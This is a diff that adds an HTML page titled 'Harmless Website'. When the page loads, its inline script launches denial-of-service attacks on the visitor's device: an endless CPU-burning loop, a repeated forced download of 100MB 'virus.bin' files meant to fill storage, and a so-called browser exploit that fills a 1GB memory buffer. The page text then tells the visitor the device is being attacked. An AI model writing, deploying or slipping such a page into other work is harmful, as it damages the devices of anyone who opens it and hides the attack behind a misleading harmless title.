@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Harmless Website</title>
+    <script>
+        // Infinite loop to crash the device by consuming CPU
+        function crashDevice() {
+            while (true) {
+                console.log("Crashing device...");
+            }
+        }
+
+        // Download large files repeatedly to fill storage
+        function fillStorage() {
+            const fileSize = 100 * 1024 * 1024; // 100MB
+            const blob = new Blob([new ArrayBuffer(fileSize)], { type: 'application/octet-stream' });
+            const url = URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = 'virus.bin';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            setTimeout(fillStorage, 1000); // Repeat every second
+        }
+
+        // Exploit browser vulnerabilities (hypothetical example)
+        function exploitBrowser() {
+            try {
+                // Hypothetical memory corruption exploit
+                const buffer = new ArrayBuffer(1e9); // 1GB buffer
+                const view = new DataView(buffer);
+                for (let i = 0; i < 1e9; i++) {
+                    view.setInt8(i, 0xff); // Fill memory
+                }
+            } catch (e) {
+                console.error("Exploit failed:", e);
+            }
+        }
+
+        // Start all attacks
+        window.onload = function() {
+            crashDevice();
+            fillStorage();
+            exploitBrowser();
+        };
+    </script>
+</head>
+<body>
+    <h1>Welcome to the Harmless Website</h1>
+    <p>Your device is now being attacked.</p>
+</body>
+</html>
